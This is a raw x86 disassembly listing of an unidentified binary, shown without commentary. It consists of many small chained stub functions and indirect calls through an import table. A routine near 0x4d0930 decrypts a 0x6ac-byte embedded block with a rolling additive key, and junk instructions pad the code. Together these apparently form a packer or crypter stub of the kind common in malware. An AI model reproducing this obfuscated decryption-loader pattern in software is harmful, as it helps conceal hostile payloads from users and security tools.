  4d0799:	sbb    eax,DWORD PTR [ecx+0x170]
  4d079f:	push   ecx
  4d07a0:	mov    edi,0x0
  4d07a5:	push   edi
  4d07a6:	call   0x4d0b28
  4d07ab:	add    esp,0x4
  4d07ae:	pop    ecx
  4d07af:	push   ecx
  4d07b0:	push   edi
  4d07b1:	push   DWORD PTR [ecx+0xa8]
  4d07b7:	push   ebx
  4d07b8:	push   DWORD PTR [ecx+0x88]
  4d07be:	call   0x4d0748
  4d07c3:	add    esp,0x10
  4d07c6:	pop    ecx
  4d07c7:	push   ecx
  4d07c8:	push   0x0
  4d07ca:	call   0x4d1570
  4d07cf:	add    esp,0x4
  4d07d2:	pop    ecx
  4d07d3:	add    esp,0x28
  4d07d6:	pop    ebp
  4d07d7:	ret    
  4d07d8:	mov    edi,edi
  4d07da:	push   ebp
  4d07db:	mov    ebp,esp
  4d07dd:	sub    esp,0x50
  4d07e0:	mov    edx,0x4d31e8
  4d07e5:	sbb    eax,esi
  4d07e7:	push   edx
  4d07e8:	mov    edx,0x0
  4d07ed:	push   edx
  4d07ee:	call   0x4d0e3c
  4d07f3:	add    esp,0x4
  4d07f6:	pop    edx
  4d07f7:	push   edx
  4d07f8:	push   esi
  4d07f9:	push   edi
  4d07fa:	push   DWORD PTR [edx+0xac]
  4d0800:	call   0x4d111c
  4d0805:	add    esp,0xc
  4d0808:	pop    edx
  4d0809:	push   edx
  4d080a:	mov    edx,0x0
  4d080f:	push   edx
  4d0810:	call   0x4d0a0c
  4d0815:	add    esp,0x4
  4d0818:	pop    edx
  4d0819:	add    esp,0x50
  4d081c:	pop    ebp
  4d081d:	ret    
  4d081e:	add    BYTE PTR [eax],al
  4d0820:	mov    edi,edi
  4d0822:	push   ebp
  4d0823:	mov    ebp,esp
  4d0825:	sub    esp,0x54
  4d0828:	lea    esi,ds:0x4d30b0
  4d082e:	or     DWORD PTR [esi+0xd8],eax
  4d0834:	push   esi
  4d0835:	push   ecx
  4d0836:	push   DWORD PTR [esi+0x170]
  4d083c:	call   0x4d0ed4
  4d0841:	add    esp,0x8
  4d0844:	pop    esi
  4d0845:	push   0x0
  4d0847:	call   0x4d0b28
  4d084c:	add    esp,0x4
  4d084f:	mov    ebx,0x4d2014
  4d0854:	mov    ebx,DWORD PTR [ebx]
  4d0856:	push   ebx
  4d0857:	push   DWORD PTR [esi+0x110]
  4d085d:	pop    eax
  4d085e:	call   eax
  4d0860:	add    esp,0x54
  4d0863:	pop    ebp
  4d0864:	ret    
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d086d:	sub    esp,0x38
  4d0870:	mov    edx,0x4d3174
  4d0875:	add    DWORD PTR [edx-0x3c],edi
  4d0878:	push   edx
  4d0879:	push   DWORD PTR [edx+0x108]
  4d087f:	push   esi
  4d0880:	push   eax
  4d0881:	call   0x4d1458
  4d0886:	add    esp,0xc
  4d0889:	pop    edx
  4d088a:	push   edx
  4d088b:	mov    esi,0x0
  4d0890:	push   esi
  4d0891:	call   0x4d0b1c
  4d0896:	add    esp,0x4
  4d0899:	pop    edx
  4d089a:	push   edx
  4d089b:	mov    eax,0x0
  4d08a0:	push   eax
  4d08a1:	call   0x4d0b28
  4d08a6:	add    esp,0x4
  4d08a9:	pop    edx
  4d08aa:	add    esp,0x38
  4d08ad:	pop    ebp
  4d08ae:	ret    
  4d08af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b5:	sub    esp,0x34
  4d08b8:	mov    eax,0x4d316c
  4d08bd:	and    ebx,esi
  4d08bf:	push   eax
  4d08c0:	push   0x0
  4d08c2:	call   0x4d0a60
  4d08c7:	add    esp,0x4
  4d08ca:	pop    eax
  4d08cb:	push   eax
  4d08cc:	push   ecx
  4d08cd:	push   DWORD PTR [eax+0xa0]
  4d08d3:	push   DWORD PTR [eax+0x2c]
  4d08d6:	call   0x4d0f64
  4d08db:	add    esp,0xc
  4d08de:	pop    eax
  4d08df:	push   eax
  4d08e0:	lea    edx,[eax-0x16c]
  4d08e6:	push   edx
  4d08e7:	call   0x4d10d0
  4d08ec:	add    esp,0x4
  4d08ef:	test   eax,eax
  4d08f1:	jne    0x4d08e0
  4d08f3:	pop    eax
  4d08f4:	add    esp,0x34
  4d08f7:	pop    ebp
  4d08f8:	ret    
  4d08f9:	add    BYTE PTR [eax],al
  4d08fb:	add    BYTE PTR [edi-0x1],bl
  4d08fe:	adc    eax,0x4d2020
  4d0903:	call   edi
  4d0905:	add    BYTE PTR [eax],al
  4d0907:	add    BYTE PTR [edi-0x1],bl
  4d090a:	adc    eax,0x4d2028
  4d090f:	call   edi
  4d0911:	add    BYTE PTR [eax],al
  4d0913:	add    BYTE PTR [edi-0x1],bl
  4d0916:	adc    eax,0x4d2034
  4d091b:	call   edi
  4d091d:	add    BYTE PTR [eax],al
  4d091f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0925:	sub    esp,0x34
  4d0928:	and    DWORD PTR [ebp-0x24],0xd
  4d092c:	lea    edx,[eax+0x3c]
  4d092f:	push   edx
  4d0930:	mov    ebx,0x6ac
  4d0935:	push   ebx
  4d0936:	mov    esi,0x6ac
  4d093b:	push   esi
  4d093c:	push   0x40001
  4d0941:	mov    edi,0x8629858a
  4d0946:	push   DWORD PTR [edi+0x7a239a86]
  4d094c:	sub    DWORD PTR [esp],0x2
  4d0950:	mov    edi,0x4d2004
  4d0955:	pop    DWORD PTR [edi]
  4d0957:	call   0x4d0c74
  4d095c:	add    esp,0x4
  4d095f:	xchg   DWORD PTR [esp],eax
  4d0962:	mov    edx,eax
  4d0964:	pop    DWORD PTR [edx+0x104]
  4d096a:	mov    esi,DWORD PTR [edx+0x104]
  4d0970:	mov    esi,esi
  4d0972:	sub    ebx,ebx
  4d0974:	dec    ebx
  4d0975:	and    ebx,0x4d0014
  4d097b:	mov    ecx,0xd5d9a824
  4d0980:	xor    eax,eax
  4d0982:	cmp    eax,0x6ac
  4d0987:	je     0x4d09a5
  4d0989:	sub    eax,0xfffffffc
  4d098c:	xor    edi,edi
  4d098e:	push   DWORD PTR [ebx+edi*1]
  4d0991:	add    DWORD PTR [esp],ecx
  4d0994:	pop    DWORD PTR [esi+edi*2]
  4d0997:	dec    DWORD PTR [esi]
  4d0999:	xor    ecx,ecx
  4d099b:	add    ecx,DWORD PTR [ebx]
  4d099d:	add    ebx,0x4
  4d09a0:	add    esi,0x4
  4d09a3:	jmp    0x4d0982
  4d09a5:	push   edx
  4d09a6:	push   0x0
  4d09a8:	call   0x4d08fc
  4d09ad:	add    esp,0x4
  4d09b0:	pop    edx
  4d09b1:	add    esp,0x34
  4d09b4:	pop    ebp
  4d09b5:	ret    
  4d09b6:	add    BYTE PTR [eax],al
  4d09b8:	pop    edi
  4d09b9:	call   DWORD PTR ds:0x4d2018
  4d09bf:	call   edi
  4d09c1:	add    BYTE PTR [eax],al
  4d09c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09c9:	sub    esp,0x50
  4d09cc:	lea    edi,[ecx-0x3c]
  4d09cf:	cmp    edi,0x5383
  4d09d5:	jbe    0x4d09c7
  4d09d7:	push   edi
  4d09d8:	push   DWORD PTR [edi+0x88]
  4d09de:	push   DWORD PTR [edi+0x10c]
  4d09e4:	push   ebx
  4d09e5:	push   edx
  4d09e6:	call   0x4d10dc
  4d09eb:	add    esp,0x10
  4d09ee:	pop    edi
  4d09ef:	push   edi
  4d09f0:	push   0x0
  4d09f2:	call   0x4d0d4c
  4d09f7:	add    esp,0x4
  4d09fa:	pop    edi
  4d09fb:	push   edi
  4d09fc:	push   0x0
  4d09fe:	call   0x4d1570
  4d0a03:	add    esp,0x4
  4d0a06:	pop    edi
  4d0a07:	add    esp,0x50
  4d0a0a:	pop    ebp
  4d0a0b:	ret    
  4d0a0c:	pop    edi
  4d0a0d:	call   DWORD PTR ds:0x4d207c
  4d0a13:	call   edi
  4d0a15:	add    BYTE PTR [eax],al
  4d0a17:	add    BYTE PTR [edi-0x1],bl
  4d0a1a:	adc    eax,0x4d208c
  4d0a1f:	call   edi
  4d0a21:	add    BYTE PTR [eax],al
  4d0a23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a29:	sub    esp,0x50
  4d0a2c:	mov    ebx,0x4d30ec
  4d0a31:	xor    eax,ebx
  4d0a33:	push   ebx
  4d0a34:	push   esi
  4d0a35:	push   eax
  4d0a36:	push   edi
  4d0a37:	push   DWORD PTR [ebx+0x13c]
  4d0a3d:	call   0x4d157c
  4d0a42:	add    esp,0x10
  4d0a45:	pop    ebx
  4d0a46:	push   0x0
  4d0a48:	call   0x4d0b1c
  4d0a4d:	add    esp,0x4
  4d0a50:	push   0x0
  4d0a52:	call   0x4d1570
  4d0a57:	add    esp,0x4
  4d0a5a:	add    esp,0x50
  4d0a5d:	pop    ebp
  4d0a5e:	ret    
  4d0a5f:	add    BYTE PTR [edi-0x1],bl
  4d0a62:	adc    eax,0x4d202c
  4d0a67:	call   edi
  4d0a69:	add    BYTE PTR [eax],al
  4d0a6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a71:	sub    esp,0x60
  4d0a74:	lea    eax,[edx+0x174]
  4d0a7a:	adc    DWORD PTR [ebp-0x3c],ecx
  4d0a7d:	push   eax
  4d0a7e:	push   DWORD PTR [eax+0x110]
  4d0a84:	push   esi
  4d0a85:	call   0x4d1010
  4d0a8a:	add    esp,0x8
  4d0a8d:	pop    eax
  4d0a8e:	push   eax
  4d0a8f:	push   0x0
  4d0a91:	call   0x4d0b1c
  4d0a96:	add    esp,0x4
  4d0a99:	pop    eax
  4d0a9a:	push   eax
  4d0a9b:	mov    esi,0x0
  4d0aa0:	push   esi
  4d0aa1:	call   0x4d0b28
  4d0aa6:	add    esp,0x4
  4d0aa9:	pop    eax
  4d0aaa:	add    esp,0x60
  4d0aad:	pop    ebp
  4d0aae:	ret    
  4d0aaf:	add    BYTE PTR [edi-0x1],bl
  4d0ab2:	adc    eax,0x4d20a0
  4d0ab7:	call   edi
  4d0ab9:	add    BYTE PTR [eax],al
  4d0abb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ac1:	sub    esp,0x28
  4d0ac4:	lea    edx,ds:0x4d31e4
  4d0aca:	mov    ecx,DWORD PTR [ebp-0x24]
  4d0acd:	push   edx
  4d0ace:	push   DWORD PTR [edx+0x120]
  4d0ad4:	push   DWORD PTR [edx+0x6c]
  4d0ad7:	push   DWORD PTR [edx+0x70]
  4d0ada:	call   0x4d08b0
  4d0adf:	add    esp,0xc
  4d0ae2:	pop    edx
  4d0ae3:	push   edx
  4d0ae4:	lea    ebx,[edx-0x1e4]
  4d0aea:	push   ebx
  4d0aeb:	call   0x4d10d0
  4d0af0:	add    esp,0x4
  4d0af3:	test   eax,eax
  4d0af5:	jne    0x4d0ae4
  4d0af7:	pop    edx
  4d0af8:	push   edx
  4d0af9:	mov    ebx,0x0
  4d0afe:	push   ebx
  4d0aff:	call   0x4d0a60
  4d0b04:	add    esp,0x4
  4d0b07:	pop    edx
  4d0b08:	add    esp,0x28
  4d0b0b:	pop    ebp
  4d0b0c:	ret    
  4d0b0d:	add    BYTE PTR [eax],al
  4d0b0f:	add    BYTE PTR [edi-0x1],bl
  4d0b12:	adc    eax,0x4d2030
  4d0b17:	call   edi
  4d0b19:	add    BYTE PTR [eax],al
  4d0b1b:	add    BYTE PTR [edi-0x1],bl
  4d0b1e:	adc    eax,0x4d2068
  4d0b23:	call   edi
  4d0b25:	add    BYTE PTR [eax],al
  4d0b27:	add    BYTE PTR [edi-0x1],bl
  4d0b2a:	adc    eax,0x4d2008
  4d0b2f:	call   edi
  4d0b31:	add    BYTE PTR [eax],al
  4d0b33:	add    BYTE PTR [edi-0x1],bl
  4d0b36:	adc    eax,0x4d2088
  4d0b3b:	call   edi
  4d0b3d:	add    BYTE PTR [eax],al
  4d0b3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b45:	sub    esp,0x34
  4d0b48:	lea    edi,ds:0x4d3020
  4d0b4e:	add    ecx,0xfffff927
  4d0b54:	push   edi
  4d0b55:	push   DWORD PTR [edi+0x128]
  4d0b5b:	push   ebx
  4d0b5c:	call   0x4d14e4
  4d0b61:	add    esp,0x8
  4d0b64:	pop    edi
  4d0b65:	push   edi
  4d0b66:	push   0x0
  4d0b68:	call   0x4d0ce4
  4d0b6d:	add    esp,0x4
  4d0b70:	pop    edi
  4d0b71:	push   edi
  4d0b72:	push   0xfffffff4
  4d0b74:	call   0x4d09b8
  4d0b79:	add    esp,0x4
  4d0b7c:	pop    edi
  4d0b7d:	add    esp,0x34
  4d0b80:	pop    ebp
  4d0b81:	ret    
  4d0b82:	add    BYTE PTR [eax],al
  4d0b84:	mov    edi,edi
  4d0b86:	push   ebp
  4d0b87:	mov    ebp,esp
  4d0b89:	sub    esp,0x3c
  4d0b8c:	mov    edx,0x4d3044
  4d0b91:	or     DWORD PTR [ebp-0x24],eax
  4d0b94:	push   edx
  4d0b95:	push   esi
  4d0b96:	push   DWORD PTR [edx+0xf4]
  4d0b9c:	push   esi
  4d0b9d:	call   0x4d13f4
  4d0ba2:	add    esp,0xc
  4d0ba5:	pop    edx
  4d0ba6:	push   edx
  4d0ba7:	lea    edi,[edx-0x44]
  4d0baa:	push   edi
  4d0bab:	call   0x4d10d0
  4d0bb0:	add    esp,0x4
  4d0bb3:	test   eax,eax
  4d0bb5:	jne    0x4d0ba7
  4d0bb7:	pop    edx
  4d0bb8:	push   edx
  4d0bb9:	push   0x0
  4d0bbb:	call   0x4d1070
  4d0bc0:	add    esp,0x4
  4d0bc3:	pop    edx
  4d0bc4:	add    esp,0x3c
  4d0bc7:	pop    ebp
  4d0bc8:	ret    
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [edi-0x1],bl
  4d0bce:	adc    eax,0x4d2070
  4d0bd3:	call   edi
  4d0bd5:	add    BYTE PTR [eax],al
  4d0bd7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bdd:	sub    esp,0x40
  4d0be0:	lea    eax,[ecx+0x9c]
  4d0be6:	or     ecx,DWORD PTR [eax-0x9c]
  4d0bec:	push   eax
  4d0bed:	mov    edx,0x0
  4d0bf2:	push   edx
  4d0bf3:	call   0x4d0a0c
  4d0bf8:	add    esp,0x4
  4d0bfb:	pop    eax
  4d0bfc:	push   eax
  4d0bfd:	push   DWORD PTR [eax+0x88]
  4d0c03:	push   DWORD PTR [eax+0x104]
  4d0c09:	push   edi
  4d0c0a:	call   0x4d06f8
  4d0c0f:	add    esp,0xc
  4d0c12:	pop    eax
  4d0c13:	push   eax
  4d0c14:	mov    edx,0x0
  4d0c19:	push   edx
  4d0c1a:	call   0x4d0ce4
  4d0c1f:	add    esp,0x4
  4d0c22:	pop    eax
  4d0c23:	add    esp,0x40
  4d0c26:	pop    ebp
  4d0c27:	ret    
  4d0c28:	push   edi
  4d0c29:	sub    edi,edi
  4d0c2b:	push   edi
  4d0c2c:	push   edi
  4d0c2d:	push   edi
  4d0c2e:	push   edi
  4d0c2f:	call   0x4d1434
  4d0c34:	sub    esp,0xfffffffc
  4d0c37:	call   0x4d0ec8
  4d0c3c:	push   0x2
  4d0c3e:	xor    eax,eax
  4d0c40:	adc    eax,0x4d3030
  4d0c45:	push   0x0
  4d0c47:	xor    ecx,ecx
  4d0c49:	adc    ecx,0x4d3036
  4d0c4f:	add    BYTE PTR [ecx],0x41
  4d0c52:	push   eax
  4d0c53:	call   0x4d0c74
  4d0c58:	pop    edi
  4d0c59:	pop    edi
  4d0c5a:	pop    edi
  4d0c5b:	lea    edi,[eax+0x3b]
  4d0c5e:	mov    edi,DWORD PTR [edi]
  4d0c60:	lea    eax,[eax+edi*1]
  4d0c63:	mov    eax,DWORD PTR [eax+0x28]
  4d0c66:	pusha  
  4d0c67:	mov    ah,0x45
  4d0c69:	sub    al,ah
  4d0c6b:	ja     0x4d0820
  4d0c71:	popa   
  4d0c72:	ret    
  4d0c73:	add    BYTE PTR [edi-0x1],bl
  4d0c76:	adc    eax,0x4d2004
  4d0c7b:	call   edi
  4d0c7d:	add    BYTE PTR [eax],al
  4d0c7f:	add    BYTE PTR [edi-0x1],bl
  4d0c82:	adc    eax,0x4d201c
  4d0c87:	call   edi
  4d0c89:	add    BYTE PTR [eax],al
  4d0c8b:	add    BYTE PTR [edi-0x1],bl
  4d0c8e:	adc    eax,0x4d2058
  4d0c93:	call   edi
  4d0c95:	add    BYTE PTR [eax],al
  4d0c97:	add    BYTE PTR [edi-0x1],bl
  4d0c9a:	adc    eax,0x4d2044
  4d0c9f:	call   edi
  4d0ca1:	add    BYTE PTR [eax],al
  4d0ca3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ca9:	sub    esp,0x34
  4d0cac:	mov    ebx,0x4d313c
  4d0cb1:	adc    eax,edi
  4d0cb3:	push   0x0
  4d0cb5:	call   0x4d0e3c
  4d0cba:	add    esp,0x4
  4d0cbd:	push   ebx
  4d0cbe:	push   DWORD PTR [ebx+0xe0]
  4d0cc4:	push   edx
  4d0cc5:	call   0x4d078c
  4d0cca:	add    esp,0x8
  4d0ccd:	pop    ebx
  4d0cce:	mov    edx,0x0
  4d0cd3:	push   edx
  4d0cd4:	call   0x4d0a60
  4d0cd9:	add    esp,0x4
  4d0cdc:	add    esp,0x34
  4d0cdf:	pop    ebp
  4d0ce0:	ret    
  4d0ce1:	add    BYTE PTR [eax],al
  4d0ce3:	add    BYTE PTR [edi-0x1],bl
  4d0ce6:	adc    eax,0x4d2054
  4d0ceb:	call   edi
  4d0ced:	add    BYTE PTR [eax],al
  4d0cef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cf5:	sub    esp,0x54
  4d0cf8:	lea    edx,ds:0x4d31cc
  4d0cfe:	cmp    edx,0x4f22
  4d0d04:	je     0x4d0cf3
  4d0d06:	push   edx
  4d0d07:	push   DWORD PTR [edx+0x8]
  4d0d0a:	push   ebx
  4d0d0b:	push   ebx
  4d0d0c:	call   0x4d1530
  4d0d11:	add    esp,0xc
  4d0d14:	pop    edx
  4d0d15:	push   edx
  4d0d16:	mov    eax,0x0
  4d0d1b:	push   eax
  4d0d1c:	call   0x4d0e3c
  4d0d21:	add    esp,0x4
  4d0d24:	pop    edx
  4d0d25:	push   edx
  4d0d26:	lea    esi,[edx-0x1cc]
  4d0d2c:	push   esi
  4d0d2d:	call   0x4d10d0
  4d0d32:	add    esp,0x4
  4d0d35:	test   eax,eax
  4d0d37:	jne    0x4d0d26
  4d0d39:	pop    edx
  4d0d3a:	add    esp,0x54
  4d0d3d:	pop    ebp
  4d0d3e:	ret    
  4d0d3f:	add    BYTE PTR [edi-0x1],bl
  4d0d42:	adc    eax,0x4d2060
  4d0d47:	call   edi
  4d0d49:	add    BYTE PTR [eax],al
  4d0d4b:	add    BYTE PTR [edi-0x1],bl
  4d0d4e:	adc    eax,0x4d200c
  4d0d53:	call   edi
  4d0d55:	add    BYTE PTR [eax],al
  4d0d57:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d5d:	sub    esp,0x34
  4d0d60:	lea    ebx,ds:0x4d300c
  4d0d66:	cmp    ebx,0x7193
  4d0d6c:	je     0x4d0d5b
  4d0d6e:	push   0x0
  4d0d70:	call   0x4d0b1c
  4d0d75:	add    esp,0x4
  4d0d78:	push   ebx
  4d0d79:	push   DWORD PTR [ebx+0x1ac]
  4d0d7f:	push   DWORD PTR [ebx+0x110]
  4d0d85:	push   DWORD PTR [ebx+0x120]
  4d0d8b:	push   DWORD PTR [ebx+0x8]
  4d0d8e:	call   0x4d0e8c
  4d0d93:	add    esp,0x10
  4d0d96:	pop    ebx
  4d0d97:	call   0x4d0c98
  4d0d9c:	add    esp,0x4
  4d0d9f:	add    esp,0x34
  4d0da2:	pop    ebp
  4d0da3:	ret    
  4d0da4:	pop    edi
  4d0da5:	call   DWORD PTR ds:0x4d2078
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x3c
  4d0db8:	mov    ecx,0x4d30dc
  4d0dbd:	mov    DWORD PTR [ecx+0x40],0x73f5
  4d0dc4:	push   ecx
  4d0dc5:	push   ebx
  4d0dc6:	push   DWORD PTR [ecx+0x108]
  4d0dcc:	call   0x4d0bd8
  4d0dd1:	add    esp,0x8
  4d0dd4:	pop    ecx
  4d0dd5:	push   ecx
  4d0dd6:	push   0x0
  4d0dd8:	call   0x4d1070
  4d0ddd:	add    esp,0x4
  4d0de0:	pop    ecx
  4d0de1:	push   ecx
  4d0de2:	mov    ebx,0x0
  4d0de7:	push   ebx
  4d0de8:	call   0x4d1570
  4d0ded:	add    esp,0x4
  4d0df0:	pop    ecx
  4d0df1:	add    esp,0x3c
  4d0df4:	pop    ebp
  4d0df5:	ret    
  4d0df6:	add    BYTE PTR [eax],al
  4d0df8:	mov    edi,edi
  4d0dfa:	push   ebp
  4d0dfb:	mov    ebp,esp
  4d0dfd:	sub    esp,0x24
  4d0e00:	lea    ecx,[eax+0x9c]
  4d0e06:	cmp    ecx,0x5cf0
  4d0e0c:	je     0x4d0dfb
  4d0e0e:	push   ecx
  4d0e0f:	push   ebx
  4d0e10:	push   eax
  4d0e11:	call   0x4d09c4
  4d0e16:	add    esp,0x8
  4d0e19:	pop    ecx
  4d0e1a:	push   ecx
  4d0e1b:	mov    eax,0x0
  4d0e20:	push   eax
  4d0e21:	call   0x4d08fc
  4d0e26:	add    esp,0x4
  4d0e29:	pop    ecx
  4d0e2a:	push   ecx
  4d0e2b:	call   0x4d0c80
  4d0e30:	add    esp,0x4
  4d0e33:	pop    ecx
  4d0e34:	add    esp,0x24
  4d0e37:	pop    ebp
  4d0e38:	ret    
  4d0e39:	add    BYTE PTR [eax],al
  4d0e3b:	add    BYTE PTR [edi-0x1],bl
  4d0e3e:	adc    eax,0x4d2024
  4d0e43:	call   edi
  4d0e45:	add    BYTE PTR [eax],al
  4d0e47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e4d:	sub    esp,0x20
  4d0e50:	lea    eax,[ecx+0x30]
  4d0e53:	sub    edx,ebx
  4d0e55:	push   eax
  4d0e56:	push   DWORD PTR [eax+0x130]
  4d0e5c:	push   ebx
  4d0e5d:	call   0x4d0fc4
  4d0e62:	add    esp,0x8
  4d0e65:	pop    eax
  4d0e66:	push   eax
  4d0e67:	mov    eax,0x0
  4d0e6c:	push   eax
  4d0e6d:	call   0x4d08fc
  4d0e72:	add    esp,0x4
  4d0e75:	pop    eax
  4d0e76:	push   eax
  4d0e77:	mov    edi,0x0
  4d0e7c:	push   edi
  4d0e7d:	call   0x4d0e3c
  4d0e82:	add    esp,0x4
  4d0e85:	pop    eax
  4d0e86:	add    esp,0x20
  4d0e89:	pop    ebp
  4d0e8a:	ret    
  4d0e8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e91:	sub    esp,0x2c
  4d0e94:	mov    ecx,0x4d3054
  4d0e99:	or     esi,DWORD PTR [ebp-0x10]
  4d0e9c:	push   ecx
  4d0e9d:	push   DWORD PTR [ecx+0x48]
  4d0ea0:	push   DWORD PTR [ecx+0x40]
  4d0ea3:	call   0x4d0e48
  4d0ea8:	add    esp,0x8
  4d0eab:	pop    ecx
  4d0eac:	push   ecx
  4d0ead:	push   0x0
  4d0eaf:	call   0x4d0a0c
  4d0eb4:	add    esp,0x4
  4d0eb7:	pop    ecx
  4d0eb8:	push   ecx
  4d0eb9:	call   0x4d0c98
  4d0ebe:	add    esp,0x4
  4d0ec1:	pop    ecx
  4d0ec2:	add    esp,0x2c
  4d0ec5:	pop    ebp
  4d0ec6:	ret    
  4d0ec7:	add    BYTE PTR [edi-0x1],bl
  4d0eca:	adc    eax,0x4d2038
  4d0ecf:	call   edi
  4d0ed1:	add    BYTE PTR [eax],al
  4d0ed3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ed9:	sub    esp,0x58
  4d0edc:	lea    ecx,[esi+0x108]
  4d0ee2:	add    DWORD PTR [ebp-0x1c],ebx
  4d0ee5:	push   ecx
  4d0ee6:	push   DWORD PTR [ecx+0x1e4]
  4d0eec:	push   DWORD PTR [ecx+0x1e0]
  4d0ef2:	push   DWORD PTR [ecx+0x198]
  4d0ef8:	push   eax
  4d0ef9:	call   0x4d0abc
  4d0efe:	add    esp,0x10
  4d0f01:	pop    ecx
  4d0f02:	push   ecx
  4d0f03:	mov    eax,0x0
  4d0f08:	push   eax
  4d0f09:	call   0x4d1570
  4d0f0e:	add    esp,0x4
  4d0f11:	pop    ecx
  4d0f12:	push   ecx
  4d0f13:	call   0x4d1434
  4d0f18:	add    esp,0x4
  4d0f1b:	pop    ecx
  4d0f1c:	add    esp,0x58
  4d0f1f:	pop    ebp
  4d0f20:	ret    
  4d0f21:	add    BYTE PTR [eax],al
  4d0f23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f29:	sub    esp,0x30
  4d0f2c:	lea    esi,ds:0x4d303c
  4d0f32:	adc    eax,DWORD PTR [ebp-0x1c]
  4d0f35:	push   esi
  4d0f36:	push   DWORD PTR [esi+0x1c]
  4d0f39:	push   DWORD PTR [esi+0x68]
  4d0f3c:	call   0x4d0a24
  4d0f41:	add    esp,0x8
  4d0f44:	pop    esi
  4d0f45:	call   0x4d0c98
  4d0f4a:	add    esp,0x4
  4d0f4d:	lea    ecx,[esi-0x3c]
  4d0f50:	push   ecx
  4d0f51:	call   0x4d10d0
  4d0f56:	add    esp,0x4
  4d0f59:	test   eax,eax
  4d0f5b:	jne    0x4d0f4e
  4d0f5d:	add    esp,0x30
  4d0f60:	pop    ebp
  4d0f61:	ret    
  4d0f62:	add    BYTE PTR [eax],al
  4d0f64:	mov    edi,edi
  4d0f66:	push   ebp
  4d0f67:	mov    ebp,esp
  4d0f69:	sub    esp,0x44
  4d0f6c:	lea    esi,[eax+0x64]
  4d0f6f:	cmp    esi,0x68f
  4d0f75:	je     0x4d0f67
  4d0f77:	push   esi
  4d0f78:	push   DWORD PTR [esi+0x3c]
  4d0f7b:	push   eax
  4d0f7c:	push   edi
  4d0f7d:	push   DWORD PTR [esi]
  4d0f7f:	call   0x4d0d58
  4d0f84:	add    esp,0x10
  4d0f87:	pop    esi
  4d0f88:	mov    edi,0x0
  4d0f8d:	push   edi
  4d0f8e:	call   0x4d0a60
  4d0f93:	add    esp,0x4
  4d0f96:	mov    edx,0x0
  4d0f9b:	push   edx
  4d0f9c:	call   0x4d0ce4
  4d0fa1:	add    esp,0x4
  4d0fa4:	add    esp,0x44
  4d0fa7:	pop    ebp
  4d0fa8:	ret    
  4d0fa9:	add    BYTE PTR [eax],al
  4d0fab:	add    BYTE PTR [edi-0x1],bl
  4d0fae:	adc    eax,0x4d2080
  4d0fb3:	call   edi
  4d0fb5:	add    BYTE PTR [eax],al
  4d0fb7:	add    BYTE PTR [edi-0x1],bl
  4d0fba:	adc    eax,0x4d2084
  4d0fbf:	call   edi
  4d0fc1:	add    BYTE PTR [eax],al
  4d0fc3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc9:	sub    esp,0x5c
  4d0fcc:	lea    ecx,ds:0x4d3194
  4d0fd2:	mov    edx,0x194e
  4d0fd7:	push   ecx
  4d0fd8:	push   0x0
  4d0fda:	call   0x4d0d4c
  4d0fdf:	add    esp,0x4
  4d0fe2:	pop    ecx
  4d0fe3:	push   ecx
  4d0fe4:	push   DWORD PTR [ecx+0x190]
  4d0fea:	push   DWORD PTR [ecx+0x120]
  4d0ff0:	push   DWORD PTR [ecx]
  4d0ff2:	call   0x4d0f24
  4d0ff7:	add    esp,0xc
  4d0ffa:	pop    ecx
  4d0ffb:	push   ecx
  4d0ffc:	mov    ecx,0x0
  4d1001:	push   ecx
  4d1002:	call   0x4d0e3c
  4d1007:	add    esp,0x4
  4d100a:	pop    ecx
  4d100b:	add    esp,0x5c
  4d100e:	pop    ebp
  4d100f:	ret    
  4d1010:	mov    edi,edi
  4d1012:	push   ebp
  4d1013:	mov    ebp,esp
  4d1015:	sub    esp,0x5c
  4d1018:	lea    edx,[eax-0x4c]
  4d101b:	sbb    ecx,DWORD PTR [edx-0x124]
  4d1021:	push   edx
  4d1022:	mov    esi,0x0
  4d1027:	push   esi
  4d1028:	call   0x4d0ce4
  4d102d:	add    esp,0x4
  4d1030:	pop    edx
  4d1031:	push   edx
  4d1032:	push   DWORD PTR [edx+0x4]
  4d1035:	push   DWORD PTR [edx+0x2c]
  4d1038:	push   DWORD PTR [edx+0xe4]
  4d103e:	call   0x4d1168
  4d1043:	add    esp,0xc
  4d1046:	pop    edx
  4d1047:	push   edx
  4d1048:	push   0x0
  4d104a:	call   0x4d0a60
  4d104f:	add    esp,0x4
  4d1052:	pop    edx
  4d1053:	add    esp,0x5c
  4d1056:	pop    ebp
  4d1057:	ret    
  4d1058:	pop    edi
  4d1059:	call   DWORD PTR ds:0x4d2090
  4d105f:	call   edi
  4d1061:	add    BYTE PTR [eax],al
  4d1063:	add    BYTE PTR [edi-0x1],bl
  4d1066:	adc    eax,0x4d2064
  4d106b:	call   edi
  4d106d:	add    BYTE PTR [eax],al
  4d106f:	add    BYTE PTR [edi-0x1],bl
  4d1072:	adc    eax,0x4d2048
  4d1077:	call   edi
  4d1079:	add    BYTE PTR [eax],al
  4d107b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1081:	sub    esp,0x3c
  4d1084:	lea    edx,ds:0x4d3074
  4d108a:	add    DWORD PTR [ebp-0x1c],eax
  4d108d:	push   edx
  4d108e:	push   0x0
  4d1090:	call   0x4d0ce4
  4d1095:	add    esp,0x4
  4d1098:	pop    edx
  4d1099:	push   edx
